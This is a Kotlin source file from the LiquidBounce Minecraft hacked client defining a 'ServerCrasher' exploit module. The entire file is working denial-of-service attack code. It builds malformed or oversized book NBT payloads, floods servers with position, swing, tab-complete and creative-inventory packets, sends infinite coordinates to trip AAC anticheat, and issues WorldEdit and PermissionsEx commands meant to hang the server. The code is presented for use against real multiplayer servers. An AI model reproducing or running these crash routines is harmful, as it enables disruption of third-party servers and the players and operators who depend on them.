/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import com.google.common.util.concurrent.ThreadFactoryBuilder
import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.extensions.sendPacketWithoutEvent
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.ListValue
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import net.minecraft.util.BlockPos
import org.apache.commons.lang3.RandomStringUtils
import java.util.concurrent.ArrayBlockingQueue
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import kotlin.random.Random

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
class ServerCrasher : Module()
{
    companion object
    {
        val bookExploitNBTTag: String
        val nettyExploitTag: String

        init
        {
            val bookExploitTagBuilder = StringBuilder(10000)
            bookExploitTagBuilder.append('{')
            repeat(5) { bookExploitTagBuilder.append("extra:[{") }
            bookExploitTagBuilder.append("text:\"#\"")
            repeat(5) { bookExploitTagBuilder.append("}],text:\"#\"") }
            bookExploitTagBuilder.append('}')

            bookExploitNBTTag = "$bookExploitTagBuilder"

            val nettyExploitTagBuilder = StringBuilder(1953)
            repeat(1953) { nettyExploitTagBuilder.append('.') }

            nettyExploitTag = "$nettyExploitTagBuilder"
        }
    }

    private val modeValue = ListValue("Mode", arrayOf("Book", "Swing", "MassiveChunkLoading", "WorldEdit", "PermissionsEx", "CubeCraft", "AAC3.1.5", "AACOther", "AAC3.0.5", "BSign", "BEdit", "Netty", "Netty2", "TabComplete", "Minehut", "OldMatrix"), "Book")

    private var workers: ThreadPoolExecutor? = null

    private fun work(block: () -> Unit)
    {
        val processors = Runtime.getRuntime().availableProcessors()
        if (workers == null) workers = ThreadPoolExecutor(processors, processors, 5L, TimeUnit.SECONDS, ArrayBlockingQueue(processors), ThreadFactoryBuilder().setDaemon(true).setNameFormat("LiquidBounce Server Crasher Worker #%d").build())

        (workers ?: return).execute(block)
    }

    private val pexTimer = MSTimer()

    private var switch = 0
    private var keepAliveKey = 0

    override fun onEnable()
    {
        val thePlayer = mc.thePlayer ?: return

        if (mc.isIntegratedServerRunning)
        {
            ClientUtils.displayChatMessage(thePlayer, "\u00A7c\u00A7lError: \u00A7aYou can't enable \u00A7c\u00A7l'ServerCrasher' \u00A7ain SinglePlayer.")
            state = false
            return
        }

        val networkManager = mc.netHandler.networkManager

        switch = 0
        keepAliveKey = 0

        when (modeValue.get().toLowerCase())
        {
            "aac3.1.5" -> work { repeat(10000) { networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(thePlayer.posX + 9412 * it, thePlayer.entityBoundingBox.minY + 9412 * it, thePlayer.posZ + 9412 * it, true)) } }
            "aacother" -> work { repeat(10000) { networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(thePlayer.posX + 500000 * it, thePlayer.entityBoundingBox.minY + 500000 * it, thePlayer.posZ + 500000 * it, true)) } }
            "aac3.0.5" -> networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true))
            "worldedit" -> thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")

            "cubecraft" ->
            {
                // Not really needed but doesn't matter
                thePlayer.setPosition(thePlayer.posX, thePlayer.posY + 0.3, thePlayer.posZ)
            }

            "massivechunkloading" -> work {
                // Fly up into sky
                var yPos = thePlayer.posY
                while (yPos < 255)
                {
                    networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(thePlayer.posX, yPos, thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5)
                {
                    networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(thePlayer.posX + i, 255.0, thePlayer.posZ + i, true))
                    i += 5
                }
            }

            "bsign" ->
            {
                val tag = NBTTagCompound()
                val pages = NBTTagList()

                repeat(50) { pages.appendTag(NBTTagString(bookExploitNBTTag)) }

                tag.setString("author", RandomStringUtils.random(16, true, false))
                tag.setString("title", RandomStringUtils.random(16, true, false))
                tag.setInteger("resolved", 1)
                tag.setTag("pages", pages)

                val book = ItemStack(Items.writable_book)

                book.tagCompound = tag

                val pb = PacketBuffer(Unpooled.buffer())
                pb.writeItemStackToBuffer(book)

                networkManager.sendPacketWithoutEvent(C17PacketCustomPayload("MC|BSign", pb))
            }

            "bedit" ->
            {
                val tag = NBTTagCompound()
                val pages = NBTTagList()

                repeat(50) { pages.appendTag(NBTTagString(bookExploitNBTTag)) }

                tag.setString("author", RandomStringUtils.random(16, true, false))
                tag.setString("title", RandomStringUtils.random(16, true, false))
                tag.setInteger("resolved", 1)
                tag.setTag("pages", pages)

                val book = ItemStack(Items.writable_book)

                book.tagCompound = tag

                val packetBuffer = PacketBuffer(Unpooled.buffer())
                packetBuffer.writeItemStackToBuffer(book)

                networkManager.sendPacketWithoutEvent(C17PacketCustomPayload("MC|BEdit", packetBuffer))
            }

            "netty" ->
            {
                val book = ItemStack(Items.writable_book)
                val author = "Netty$nettyExploitTag"

                val tag3 = NBTTagCompound()
                val list3 = NBTTagList()

                repeat(340) { list3.appendTag(NBTTagString(nettyExploitTag)) }

                tag3.setString("author", author)
                tag3.setString("title", nettyExploitTag)
                tag3.setTag("pages", list3)

                if (book.tagCompound != null)
                {
                    val tagb = book.tagCompound
                    tagb?.setTag("pages", list3)
                }
                else book.setTagInfo("pages", list3)

                networkManager.sendPacketWithoutEvent(C08PacketPlayerBlockPlacement(BlockPos(thePlayer.posX, thePlayer.posY - 2.0, thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f))
            }

            "netty2" ->
            {
                val book = ItemStack(Items.writable_book)
                val author4 = "Netty$nettyExploitTag"

                val tag4 = NBTTagCompound()
                val list4 = NBTTagList()

                repeat(340) { list4.appendTag(NBTTagString(nettyExploitTag)) }

                tag4.setString("author", author4)
                tag4.setString("title", nettyExploitTag)
                tag4.setTag("pages", list4)

                if (book.tagCompound != null)
                {
                    val tagb = book.tagCompound
                    tagb?.setTag("pages", list4)
                }
                else book.setTagInfo("pages", list4)

                work {
                    repeat(10000) {
                        networkManager.sendPacketWithoutEvent(C10PacketCreativeInventoryAction(100, book))
                    }
                }
            }
        }
    }

    override fun onDisable()
    {
        workers?.shutdownNow()
        workers = null
    }

    @EventTarget
    fun onMotion(event: MotionEvent)
    {
        val thePlayer = mc.thePlayer ?: return

        if (event.eventState == EventState.POST) return

        val networkManager = mc.netHandler.networkManager

        when (modeValue.get().toLowerCase())
        {
            "book" ->
            {
                val bookStack = ItemStack(Items.writable_book)
                val bookCompound = NBTTagCompound()

                bookCompound.setString("author", RandomUtils.randomNumber(16))
                bookCompound.setString("title", RandomUtils.randomNumber(16))

                val pageList = NBTTagList()
                val pageText = RandomUtils.randomNumber(600)

                repeat(50) { pageList.appendTag(NBTTagString(pageText)) }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                work {
                    val bsign = Random.nextBoolean()
                    repeat(100) {
                        val packetBuffer = PacketBuffer(Unpooled.buffer())
                        packetBuffer.writeItemStackToBuffer(bookStack)
                        networkManager.sendPacketWithoutEvent(C17PacketCustomPayload(if (bsign) "MC|BSign" else "MC|BEdit", packetBuffer))
                    }
                }
            }

            "cubecraft" ->
            {
                val x = thePlayer.posX
                val y = thePlayer.posY
                val z = thePlayer.posZ

                work {
                    repeat(3000) {
                        networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(x, y + 0.09999999999999, z, false))
                        networkManager.sendPacketWithoutEvent(C04PacketPlayerPosition(x, y, z, true))
                    }
                }

                thePlayer.motionY = 0.0
            }

            "permissionsex" -> if (pexTimer.hasTimePassed(2000))
            {
                // Send crash command
                thePlayer.sendChatMessage(if (Random.nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }

            "swing" -> work {
                repeat(5000) { networkManager.sendPacketWithoutEvent(C0APacketAnimation()) }
            }

            "tabcomplete" -> work {
                repeat(5000) { networkManager.sendPacketWithoutEvent(C14PacketTabComplete("/")) }
            }

            "minehut" ->
            {
                switch++
                keepAliveKey += 8

                networkManager.sendPacketWithoutEvent(C03PacketPlayer(switch == 1))
                networkManager.sendPacketWithoutEvent(C00PacketKeepAlive(keepAliveKey))
            }

            "oldmatrix" -> if (thePlayer.ticksExisted % 2 == 0) mc.netHandler.addToSendQueue(C04PacketPlayerPosition(Random.nextDouble(-32768.0, 32768.0), Random.nextDouble(-32768.0, 32768.0), Random.nextDouble(-32768.0, 32768.0), true))

            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent)
    {
        if (event.worldClient == null) state = false // Disable module in case you left (or crashed) from the server
    }

    @EventTarget
    fun onTick(@Suppress("UNUSED_PARAMETER") event: TickEvent)
    {
        if (mc.thePlayer == null || mc.theWorld == null) state = false // Disable module in case you left (or crashed) from the server
    }

    override val tag: String
        get() = modeValue.get()
}
